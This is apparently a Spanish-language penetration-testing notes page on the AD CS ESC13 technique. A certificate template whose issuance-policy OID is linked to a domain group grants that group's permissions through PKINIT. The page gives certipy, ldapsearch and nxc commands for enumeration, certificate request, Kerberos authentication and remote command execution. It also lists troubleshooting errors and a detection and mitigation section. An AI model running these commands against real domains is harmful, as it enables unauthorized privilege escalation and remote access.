---
title: AD CS — ESC13 (política de emisión enlazada a un grupo)
tags: [windows, adcs, kerberos, esc13, privesc]
---

# AD CS: ESC13, un certificado que te mete en un grupo

[🇬🇧 English](adcs-esc13.en.md) | **Español**

## 1. Qué es

Una plantilla puede llevar una **política de emisión** (`msPKI-Certificate-Policy`) con un OID. Ese OID apunta a un objeto de política cuyo atributo `msDS-OIDToGroupLink` enlaza con un grupo del dominio. Cuando el certificado se usa para **PKINIT**, el KDC añade el SID de ese grupo al PAC: la sesión resultante tiene los permisos del grupo aunque la cuenta no sea miembro.

Es la diferencia con ESC1: aquí no suplantas a nadie, te dan un grupo. Si ese grupo está en el `LocalGroups`/`Remote Desktop Users`/WinRM del host, tienes shell.

El grupo enlazado debe ser **universal y estar vacío**: AD no permite apuntar un OID a un grupo con miembros.

## 2. Enumerar

```bash
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -vulnerable -stdout
```

En la salida, la plantilla aparece marcada como `ESC13` y muestra:

```text
Certificate Policies : <OID>
Issuance Policy      : <nombre de la política>
Linked Group         : <DOMINIO>\<grupo>
```

También se puede ver a mano:

```bash
# leer la plantilla; `certipy template` sin flags la reescribe para ESC1
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <DC_IP> -template '<TEMPLATE>' -stdout
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<password>' \
  -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink
```

## 3. Pedir el certificado y autenticar

```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>' -dc-ip <DC_IP>
certipy auth -pfx '<user>.pfx' -dc-ip <DC_IP>
```

`certipy auth` devuelve un `ccache` y el hash NT de la cuenta. Con el `ccache`:

```bash
export KRB5CCNAME='<user>.ccache'
nxc winrm <TARGET> -k --use-kcache
nxc smb <TARGET> -k --use-kcache -x 'whoami /groups'
```

`whoami /groups` debe mostrar el grupo enlazado: si no aparece, el PAC se generó antes del cambio o el ticket es de otro realm.

## 4. Cuándo falla

- **`KRB_AP_ERR_SKEW`** → reloj desincronizado más de 5 minutos. Ver [reloj y Kerberos](../general/kerberos-clock.md).
- **`KDC_ERR_CLIENT_NOT_TRUSTED`** → el certificado no encadena con una CA en `NTAuthCertificates`.
- **`KDC has no support for encryption type`** → el KDC no acepta el tipo de clave del certificado; repetir con `-dc-ip` y una plantilla con RSA moderno.
- **Certificado emitido pero sin grupo** → el OID no tiene el enlace, o el enlace apunta a un grupo de otro dominio.
- **`certipy req` pide credenciales otra vez** → la plantilla exige aprobación del manager (`msPKI-Enrollment-Flag` con `PEND_ALL_REQUESTS`).

## 5. Detección y mitigación

- Eventos **4886/4887** (certificado solicitado/emitido) con plantillas que llevan política de emisión, sobre todo desde cuentas que no la usaban antes.
- **4768** con `PreAuthType` de certificado (PKINIT) hacia un host al que la cuenta no accedía.
- Auditar los enlaces `msDS-OIDToGroupLink` y las políticas de emisión: quitarlos si no son imprescindibles.
- Exigir aprobación o firmas autorizadas en esas plantillas y limitar quién puede inscribirse.
- Monitorizar la creación de objetos en `CN=OID,CN=Public Key Services`.

MITRE: T1649, T1558, T1078.
